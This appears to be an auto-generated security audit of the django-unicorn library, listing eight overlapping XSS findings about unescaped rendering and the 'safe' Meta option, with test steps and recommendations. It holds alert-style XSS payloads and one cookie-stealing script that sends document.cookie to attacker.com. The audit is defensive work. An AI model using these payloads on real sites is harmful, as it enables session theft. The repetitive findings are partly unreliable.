### Vulnerabilities List

#### 1. Vulnerability Name: Inconsistent HTML Encoding leading to Cross-Site Scripting (XSS)

- **Description:**
    - Prior to version 0.36.0, django-unicorn responses were not consistently HTML encoded.
    - An attacker could inject malicious scripts into the template if user-provided input was not properly sanitized before being rendered by a Django Unicorn component.
    - An attacker could craft a request to a django-unicorn component with malicious JavaScript code in user-controlled input fields.
    - If this input is rendered without proper HTML encoding, the JavaScript code would be executed in the victim's browser, leading to XSS.
- **Impact:**
    - Cross-Site Scripting (XSS) vulnerability.
    - An attacker can execute arbitrary JavaScript code in the victim's browser when they interact with a vulnerable django-unicorn component.
    - This can lead to session hijacking, defacement, redirection to malicious sites, or other malicious actions performed on behalf of the victim.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - Starting from version 0.36.0, django-unicorn responses are HTML encoded by default.
    - Component initialization data is sanitized using the `sanitize_html` function in `django_unicorn\django_unicorn\utils.py`. This function escapes HTML/XML special characters and marks the string as safe for HTML output.
- **Missing Mitigations:**
    - Developers can still bypass HTML encoding using `safe` filter or `Meta.safe` option, potentially re-introducing XSS vulnerabilities if used improperly on user-controlled input.
    - Lack of warnings or prevention mechanisms against using `safe` on user-provided data.
    - Documentation could strongly emphasize the risks of using `safe` with user-provided input.
- **Preconditions:**
    - Vulnerable versions of django-unicorn prior to 0.36.0 are used.
    - Or, developers are incorrectly using `safe` filter or `Meta.safe` option on user-provided input in version 0.36.0 or later.
- **Source Code Analysis:**
    - In `django_unicorn\components\unicorn_template_response.py`, the `render` method serializes component data into JSON format and embeds it into the HTML.
    - The `sanitize_html` function in `django_unicorn\utils.py` is applied to the component initialization JSON data, escaping HTML special characters.
    - However, developers can bypass HTML encoding using `safe` filter or `Meta.safe` option, as these features are not sanitized.
- **Security Test Case:**
    1. Setup a vulnerable django-unicorn application (version < 0.36.0 or using `safe`).
    2. Create a component with a vulnerable field that renders user input with `safe` or in version < 0.36.0.
    3. Inject malicious JavaScript payload, e.g., `<img src=x onerror=alert('XSS')>`, through user input.
    4. Access the page and observe the execution of the injected JavaScript code (e.g., alert box).
    5. Verify mitigation in newer versions (>= 0.36.0 without `safe`) where the script should be rendered as text.

#### 2. Vulnerability Name: Potential Cross-Site Scripting (XSS) through `safe` Meta Option

- **Description:**
    - Django-unicorn allows marking component fields as `safe` via `Meta` to bypass default HTML encoding.
    - If a developer marks a field rendering user-controlled data as `safe` without sanitization, it can lead to XSS.
    - An attacker can inject malicious JavaScript into user input.
    - When the component renders, this malicious code executes in the victim's browser because `safe` prevents HTML encoding.
- **Impact:**
    - Cross-Site Scripting (XSS) vulnerability.
    - Attackers can hijack sessions, steal cookies, redirect users to malicious sites, and deface web pages.
    - In critical scenarios, it can lead to complete compromise of user accounts and sensitive data.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - Default HTML encoding for updated field values is implemented to prevent XSS in common cases.
    - Documentation mentions default encoding and `safe` as opt-in to disable it.
    - `sanitize_html` utility function exists in `django_unicorn\utils.py` for escaping HTML special characters.
- **Missing Mitigations:**
    - Lack of prominent warnings in documentation about security risks of using `safe` with user-controlled data.
    - No guidance or best practices on sanitizing user inputs when using `safe`.
    - `sanitize_html` is not enforced or suggested for use with `safe` option in documentation.
- **Preconditions:**
    - Django-unicorn component renders user input.
    - Developer marks a field with user-controlled data as `safe` in `Meta`.
    - Attacker can inject malicious JavaScript into user input bound to the `safe` field.
- **Source Code Analysis:**
    - Documentation (`docs\source\views.md`) confirms default HTML encoding and `safe` as bypass.
    - Code review (`django_unicorn\views\action_parsers\sync_input.py`, `django_unicorn\views\action_parsers\utils.py`) shows `set_property_value` updates properties without sanitization when `safe` is enabled.
    - `django_unicorn\utils.py` has `sanitize_html` but it's not automatically applied with `safe`.
    - `django_unicorn\tests\views\test_process_component_request.py` includes `test_safe_html_entities_not_encoded` test verifying that `safe` disables encoding.
    - Visualization:
        ```
        User Input (Malicious JavaScript) --> HTTP Request --> Django-unicorn (syncInput action) --> set_property_value (NO SANITIZATION for 'safe' fields) --> Component.field (marked as safe) --> Django Template Rendering (unescaped output) --> Browser (JavaScript execution) --> XSS Vulnerability
        ```
- **Security Test Case:**
    1. Setup Django project with django-unicorn.
    2. Create `safe_xss_component` with `unsafe_input` field marked as `safe` in `Meta`.
    3. Template (`templates/unicorn/safe_xss_component.html`) renders `unsafe_input` in `div` with `id="xss_output"`.
    4. Create Django view and template to render `safe_xss_component`.
    5. Access application in browser.
    6. Inject XSS payload `<img src=x onerror=alert('XSS Vulnerability')>` into input field.
    7. Observe XSS execution (alert box).

#### 3. Vulnerability Name: Reflected Cross-Site Scripting (XSS) through Unsanitized Component Properties

- **Description:**
    1. Attacker injects JavaScript payload into a django-unicorn component property via malicious URL or input fields.
    2. `syncInput` action parser uses `set_property_value` to update component property with unsanitized value.
    3. Component template renders injected JavaScript payload without sanitization.
    4. User views page and injected JavaScript executes in browser, leading to XSS.
- **Impact:**
    - Account Takeover (session cookie theft)
    - Data Theft
    - Defacement
    - Redirection to Malicious Sites
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - Default HTML encoding for updated field values (mentioned in docs).
- **Missing Mitigations:**
    - No server-side input sanitization for user-provided data before storing in component properties.
    - Reliance on Django's template engine auto-escaping, bypassed by `safe` or custom template logic.
    - Lack of context-aware output encoding guidance in documentation.
- **Preconditions:**
    - Django-unicorn component renders user-controlled data from properties.
    - No explicit sanitization for user inputs in component Python code.
    - Potential misuse of `safe` meta attribute or template filters.
- **Source Code Analysis:**
    1. `django_unicorn\views\action_parsers\sync_input.py`: `handle` function extracts `property_name` and `property_value` and calls `set_property_value`.
    2. `django_unicorn\views\action_parsers\utils.py`: `set_property_value` directly sets `property_value` to component attribute without sanitization.
    3. `django_unicorn\components\unicorn_view.py`: `_set_property` directly assigns value to property, no sanitization.
    - Visualization:
        ```
        User Input (Malicious Script) --> HTTP Request (unicorn:model update) --> Django Unicorn Backend --> sync_input.py --> set_property_value() --> Component Property (Unsanitized) --> Template Rendering --> HTML Response (XSS Payload) --> User Browser (Script Execution)
        ```
- **Security Test Case:**
    1. Create `XssTestView` component with `message` property.
    2. Template: input bound to `message` and div displaying `{{ message }}`.
    3. Create Django view and template including component.
    4. Access page in browser.
    5. Inject `<script>alert("XSS Vulnerability");</script>` in input field.
    6. Observe alert box confirming XSS.
    7. Test cookie stealing payload `<script>window.location='http://attacker.com/cookie_steal?cookie='+document.cookie;</script>`.

#### 4. Vulnerability Name: Potential XSS vulnerability when using `safe` Meta option

- **Description:**
    1. Developer uses `safe` Meta option to disable HTML encoding for variables.
    2. Template renders these variables directly without sanitization.
    3. Attacker injects malicious JavaScript, bound to `safe` variables via user input.
    4. Component re-renders, malicious JavaScript is injected into HTML output unescaped.
    5. User's browser executes malicious script, leading to XSS.
- **Impact:**
    - Cross-Site Scripting (XSS)
    - Session hijacking, data theft, defacement, redirection to malicious websites.
- **Vulnerability Rank:** Medium
- **Currently Implemented Mitigations:**
    - Default HTML Entity Encoding.
    - `sanitize_html` function for JSON data in `<script>` tags (not for `safe` template rendering).
- **Missing Mitigations:**
    - No security warning in documentation about `safe` Meta option risks.
    - No automatic sanitization for `safe` variables.
    - Lack of security test cases and best practices for `safe` usage.
- **Preconditions:**
    - `safe` Meta option enabled for a variable.
    - Direct rendering of user input bound to `safe` variable without sanitization.
    - User interaction allowing attacker to control `safe` variable value.
- **Source Code Analysis:**
    - `django_unicorn\components\unicorn_template_response.py`: No sanitization for `safe` variables during template rendering.
    - `tests\views\test_process_component_request.py`: `test_safe_html_entities_not_encoded` confirms `safe` bypasses encoding.
    - `django_unicorn\utils.py`: `sanitize_html` exists but not applied to `safe` variables.
    - `django_unicorn\views\__init__.py`: `safe` fields are marked `mark_safe` without sanitization.
    - Code snippet from `tests\views\test_process_component_request.py`: Verifies `safe` renders unencoded HTML.
- **Security Test Case:**
    1. Create Django app `vuln_test`.
    2. Create `XSSComponentView` with `unsafe_data` field marked as `safe` in `Meta`.
    3. Template (`vuln_test/templates/unicorn/xss-component.html`) renders `unsafe_data`.
    4. Django view and template to render `XSSComponentView`.
    5. Access `/vuln/xss-test/` in browser.
    6. Inject XSS payload `?unsafe_data=%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E` in URL.
    7. Reload and observe XSS alert.

#### 5. Vulnerability Name: Cross-Site Scripting (XSS) vulnerability due to misuse of `safe` Meta attribute

- **Description:**
    - Step 1: Developer uses `Meta.safe` to mark field as "safe" to bypass encoding (like pre-CVE-2021-42053 behavior).
    - Step 2: "Safe" field bound to user input using `unicorn:model`.
    - Step 3: Template directly renders "safe" field without sanitization.
    - Step 4: Attacker crafts malicious input (e.g., `<img src=x onerror=alert('XSS Vulnerability')>`).
    - Step 5: Victim interacts, malicious input rendered back due to Django Unicorn reactivity.
    - Step 6: Malicious JavaScript executes in browser, leading to XSS because of `safe` and no sanitization.
- **Impact:**
    - Cross-Site Scripting (XSS)
    - Session hijacking, redirection to malicious websites, defacement, other malicious actions.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - Default HTML-encoding of component data in templates (post CVE-2021-42053 fix).
    - Default encoding is global mitigation unless `Meta.safe` is used.
    - No specific mitigations for `Meta.safe` usage found in code analysis. `sanitize_html` not used for `safe` fields.
- **Missing Mitigations:**
    - Lack of strong documentation warnings against `Meta.safe` with user data.
    - No guidance on input sanitization when using `Meta.safe`.
    - No automatic sanitization for `safe` fields, developer responsibility for sanitization.
- **Preconditions:**
    - Django Unicorn application.
    - Component defines `safe` field in `Meta`.
    - `safe` field bound to user input via `unicorn:model`.
    - Template renders `safe` field directly without sanitization.
    - Attacker can provide user input to the vulnerable component.
- **Source Code Analysis:**
    - `django_unicorn\views\message.py`: Endpoint for AJAX requests, re-rendering process needs sanitization for "safe" fields.
    - `django_unicorn\components\unicorn_view.py`: `Meta.safe` processed during rendering, bypasses default encoding without sanitization.
    - `django_unicorn\serializer.py`: Serialization process lacks built-in HTML sanitization, especially for `safe` fields.
    - `django_unicorn\tests\views\test_process_component_request.py`: `test_safe_html_entities_not_encoded` confirms `Meta.safe` bypasses encoding.
- **Security Test Case:**
    - Step 1: Setup Django project with Django Unicorn.
    - Step 2: Create `unsafe-component` with `unsafe_data` and `Meta.safe = ("unsafe_data", )`.
    - Step 3: `unsafe-component.html`: input bound to `unsafe_data`, div displaying `{{ unsafe_data }}`.
    - Step 4: Django template `index.html` includes `unsafe-component`.
    - Step 5: Django view renders `index.html`.
    - Step 6: URL `/unsafe-xss-test/` mapped to view.
    - Step 7: Run Django server.
    - Step 8: Open `/unsafe-xss-test/` in browser.
    - Step 9: Input `<img src=x onerror=alert('XSS Vulnerability')>` in input field.
    - Step 10: Click outside input field.
    - Step 11: Observe alert box "XSS Vulnerability".

#### 6. Vulnerability Name: Cross-Site Scripting (XSS) through Unsafe Template Rendering of `unicorn:model` Data

- **Description:**
    - Step 1: Attacker crafts malicious JavaScript (e.g., `<img src=x onerror=alert('XSS')>`).
    - Step 2: Injects into form field bound to component property using `unicorn:model`.
    - Step 3: User interaction triggers server-side update and re-render.
    - Step 4: `set_property_value` and `set_property_from_data` update property without sanitization.
    - Step 5: Component template directly renders `user_input` property (e.g., `<div>{{ user_input }}</div>`).
    - Step 6: Template rendering doesn't escape by default (unless Django engine or unicorn handles it, but default can be bypassed).
    - Step 7: Injected script executes in browser after re-render, leading to XSS.
- **Impact:**
    - Cross-Site Scripting (XSS)
    - Account takeover, defacement, redirection, data theft, malware installation.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - Default HTML Encoding (Django template auto-escaping).
    - `safe` Filter/Meta to opt-out of encoding.
    - CSRF Protection (Django).
    - `sanitize_html` function (for JSON init data).
- **Missing Mitigations:**
    - Stronger emphasis on sanitization in documentation.
    - Clear best practices for developers on avoiding XSS, especially with `safe`.
    - More security test cases in docs and test suite, covering `safe` scenarios.
- **Preconditions:**
    - Django application uses django-unicorn.
    - Component template renders user data bound via `unicorn:model`.
    - Developers either: rely on default Django escaping (potentially insufficient) or use `safe` without sanitization.
- **Source Code Analysis:**
    - `django_unicorn\utils.py`: `sanitize_html` for JSON init data.
    - `tests/views/test_process_component_request.py`: Tests for HTML encoding behavior, `safe` disabling effect.
    - `tests/test_utils.py`: Tests for `sanitize_html`.
    - Rendering files (`templatetags`, `components`): Django auto-escaping default, `safe` bypasses unicorn escaping. `sanitize_html` for JSON only.
    - `django_unicorn/views/action_parsers/utils.py`, `django_unicorn/views/utils.py`: `set_property_value`, `set_property_from_data` lack sanitization of user input before property update.
- **Security Test Case:**
    - Step 1: Create `XssUnsafeModelView` component with `user_input` property.
    - Step 2: `unicorn/xss-unsafe-model.html`: input bound to `user_input`, div displays `{{ user_input }}`.
    - Step 3: `xss_unsafe_view` in `views.py` and `xss_unsafe_template.html` to render component.
    - Step 4: `urls.py` for `/xss-unsafe/` URL.
    - Step 5: Access `/xss-unsafe/` in browser.
    - Step 6: Input `<img src=x onerror=alert('XSS-Unsafe-Model')>` in input field.
    - Step 7: Trigger component update.
    - Step 8: Observe alert box 'XSS-Unsafe-Model'.

#### 7. Vulnerability Name: Cross-Site Scripting (XSS) in component properties rendering

- **Description:**
    - Attacker injects malicious JavaScript into component property.
    - JavaScript executes in user's browser during component rendering due to lack of sanitization.
    - Step 1: Attacker crafts malicious input (e.g., `<img src=x onerror=alert("XSS")>`).
    - Step 2: Input passed as component property value (URL params, form input, etc.). Example URL: `/component-view/?user_input=<img src=x onerror=alert("XSS")>`.
    - Step 3: Django renders template with vulnerable component, passing user input to component.
    - Step 4: django-unicorn renders component with unsanitized JavaScript, especially if `safe` is used.
    - Step 5: Browser executes JavaScript (e.g., alert box "XSS").
- **Impact:**
    - Cross-Site Scripting (XSS)
    - Account hijacking, session theft, defacement, redirection, data theft, malware.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - `safe` Meta option documentation in `views.md` indicates default HTML encoding unless `safe` is used.
    - `django_unicorn.utils.sanitize_html` exists but mainly for JSON init data.
- **Missing Mitigations:**
    - Relies on developers not using `safe` for user input for default HTML encoding.
    - No clear documentation warning about `safe` risks.
    - No enforced input sanitization for properties, depends on Django auto-escaping (bypassed by `safe`).
    - `safe` should be for trusted HTML only, clearer mechanism and warnings needed.
- **Preconditions:**
    - Django-unicorn application.
    - User input influences component properties rendered in templates.
    - Developer marks property as `safe` and doesn't sanitize user input.
- **Source Code Analysis:**
    - `django_unicorn/components/unicorn_view.py`, `UnicornTemplateResponse`: Rendering process uses Django templates, `BeautifulSoup` for DOM morphing but not property sanitization before template render.
    - `_desoupify` in `UnicornTemplateResponse` for HTML formatting, not sanitization.
    - `django_unicorn.utils.sanitize_html` for JSON init data only.
    - Default HTML encoding is Django's auto-escaping, bypassed by `safe`.
    - `tests/views/test_process_component_request.py` tests confirm `safe` bypasses encoding.
    - `django_unicorn/views/action_parsers/sync_input.py`, `django_unicorn/views/action_parsers/utils.py`, `django_unicorn/tests/views/utils/test_set_property_from_data.py`: Property update functions lack sanitization, user data can reach component properties unsanitized.
- **Security Test Case:**
    - Step 1: Create `xss-safe-test` component with `user_input` property marked `safe` in `Meta`.
    - Step 2: `templates/unicorn/xss-safe-test.html`: `{{ user_input }}`.
    - Step 3: `views.py`: `xss_safe_test_view` gets `user_input` from URL query param.
    - Step 4: `templates/xss_safe_test_template.html`: Renders `xss-safe-test` component with `user_input`.
    - Step 5: Access `/xss_safe_test/?user_input=<img src=x onerror=alert("XSS_SAFE")>`.
    - Step 6: Observe alert box "XSS_SAFE" confirming vulnerability.

#### 8. Vulnerability Name: Cross-Site Scripting (XSS) through Unsafe Output using `safe` Meta Option

- **Description:**
    1. Developer uses `safe` Meta option to disable HTML escaping.
    2. Variable rendered in template `{{ variable }}` without escaping filters.
    3. Attacker injects JavaScript (e.g., via `unicorn:model` bound form field).
    4. Component re-renders, injected JavaScript executes due to disabled escaping by `safe`.
- **Impact:**
    - High
    - Account takeover, defacement, redirection, data theft, unauthorized actions.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - Default HTML encoding (mentioned in docs).
    - `django_unicorn/views/__init__.py`: Logic for `safe` Meta option using `mark_safe`.
    - Developer-implemented input sanitization (not enforced by framework).
- **Missing Mitigations:**
    - No explicit warning against using `safe` with user data in code or documentation. Documentation mentions `safe` but lacks strong security warning.
    - No security test case for `safe` misuse with malicious input.
    - No built-in sanitization for `safe` option.
- **Preconditions:**
    1. Unicorn component renders user-controlled data.
    2. `Meta.safe` includes variable rendering user data.
    3. Template renders variable `{{ variable }}` without escaping.
    4. Attacker can control variable value (e.g., `unicorn:model` form field).
- **Source Code Analysis:**
    1. `docs\source\views.md`: Describes `safe` option, indicating bypass of default XSS protection.
    2. `django_unicorn\views\__init__.py`: `_process_component_request` applies `mark_safe` for `safe` fields, bypassing escaping.
    3. `django_unicorn\views\action_parsers\sync_input.py`: `handle` and `set_property_value` show user input updates component state. `django_unicorn\views\action_parsers\utils\test_set_property_value.py` and `django_unicorn\tests\views\utils\test_set_property_from_data.py` confirm input handling.
    4. `django_unicorn\components\unicorn_template_response.py`: `render` method renders template, `BeautifulSoup` parsing doesn't re-escape `safe` variables. `django_unicorn\tests\components\test_unicorn_template_response.py` confirms rendering logic.
    5. `tests\views\test_process_component_request.py`: `test_safe_html_entities_not_encoded` test demonstrates `safe` bypasses encoding and is POC for XSS.
- **Security Test Case:**
    1. Django project with django-unicorn.
    2. `safe_xss_component` with `text` variable and `Meta: safe = ("text", )`.
    3. `safe_xss_component.html`: input bound to `text`, div with `{{ text }}`.
    4. Django template `test_template.html` includes `safe_xss_component`.
    5. Django view renders `test_template.html`.
    6. Run Django server.
    7. Open page in browser.
    8. Input `<img src=x onerror=alert('XSS Vulnerability')>` in input field.
    9. Click outside input field.
    10. Observe alert box "XSS Vulnerability".

- **Recommendation:**
    - **Enhance Documentation**: Document security risks of `safe` Meta option, emphasize use only for safe HTML, warn against user data without sanitization, add strong warning about XSS, include sanitization examples.
    - **Consider Runtime Warning (Optional)**: Dev-mode warning for `safe` with `unicorn:model` and direct template rendering without escaping (careful consideration needed).
    - **Security Test**: Add security test case like described above to test suite.
    - **Introduce Sanitization Helper (Optional)**: Utility function/template filter for sanitizing user input for `safe` option.
